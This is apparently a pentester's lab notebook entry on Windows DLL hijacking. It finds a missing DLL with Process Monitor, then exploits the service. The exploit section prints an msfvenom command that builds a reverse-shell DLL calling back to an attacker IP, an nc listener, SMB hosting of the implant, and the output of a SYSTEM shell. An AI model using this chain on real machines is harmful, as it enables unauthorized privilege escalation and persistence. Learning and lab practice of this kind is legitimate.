# Living off the Land

This is properly one of the best methods for privilege escalations and a great vector for persistence mechanism. DLL hijacking that can take advantage of a missing DLL file from the vulnerable windows computer with specific parameters in place. An attacker replace it with a callback shell to a connection with system privileges.

## 01 - Detect

### 1.1 - Process Monitor

TODO: Rewrite from command prompt to powershell

```
C:\> wmic service get name,startname,pathname,startmode where pathname like 'LocalSystem' | findstr /i "c:\program files"
dllsvc                               "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                                 LocalSystem
```

Retrieve the `Procmon.exe` from sysinternals via WebDAV.

```
C:\> net use Z: \\live.sysinternals.com\tools

copy Z:\Procmon64.exe .

net use Z: /delete
```

Note: You must run these steps as an **Administrator**

Open **Procmon.exe** then go to **Filter** > **Filter...** or you can use a shortcut keyboard `Ctrl + L` from the image below.

![[01 - Procmon Fliter Process.png]]

Select **Process Name**.

![[02 - Procmon Process Name.png]]

Select **Process Name** with **is** as a condition then choose/write the process name `dllhijackservice.exe` then select **Include** then click **Add** to apply filter.

![[03 - Procmon Process Name Conditions.png]]

Select **Result** with **is** as a condition then select **NAME NOT FOUND** then **Include** then **Add** to apply filter.

![[04 - Procmon Result Conditions.png]]

Then click **OK** or **Apply** to put in changes.

![[05 - Procmon Monitor Filter.png]]

Then start the DLL service.

```
C:\> sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1832
        FLAGS              :
```

Looks like we have possible location as a user to hijack in the **Temp** folder since it's writable.

![[06 - Procmon Potential Vulnerability.png]]

## 02 - Exploit

Generate a DLL implant, start a shell handler (listener), and you can choose whatever server program to host files. Hosting an SMB server is easier to do.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.8.145.108 lport=53 -f dll -o hijackme.dll

$ sudo nc -lnvp 53 
Listening on 0.0.0.0 53

$ sudo smbserver.py share $(pwd)
```

Copy the implant and restart the service to execute it.

```
C:\Users\user>copy \\10.8.145.108\share\hijackme.dll C:\Temp\
        1 file(s) copied.

C:\Users\user>sc start dllsvc
[SC] StartService FAILED 1056:

An instance of the service is already running.


C:\Users\user>sc stop dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\user>sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3100
        FLAGS              :

C:\Users\user>
```

You should receive the incoming connection from a detonated implant.

```
$ sudo nc -lnvp 53 
Listening on 0.0.0.0 53
Connection received on 10.10.229.49 49213
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## 03 - Cleanup

```
C:\Windows\system32>tasklist /svc | findstr dllsvc
tasklist /svc | findstr dllsvc

dllhijackservice.exe          3704 dllsvc

C:\Windows\system32>taskkill /f /im dllhijackservice.exe
SUCCESS: The process "dllhijackservice.exe" with PID 3704 has been terminated.

C:\Windows\system32>del C:\Temp\hijackme.dll
del C:\Temp\hijackme.dll

C:\Windows\system32> sc start dllsvc
sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1832
        FLAGS              :
```

---
## References

- [Sysinternals: Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

- [Sysinternals: ListDLLs](https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls)

- [fashionproof Source Repository: RunHijackHunter](https://github.com/fashionproof/RunHijackHunter)

- [Red Team Notes: T1038 - DLL Hijacking](https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking)

- [Pentestlab Blog:  DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)

- [Mark Mo: Finding writable folders and hijackable DLLs](https://medium.com/@markmotig/finding-writable-folders-and-hijackable-dlls-3594a9a0b1c8)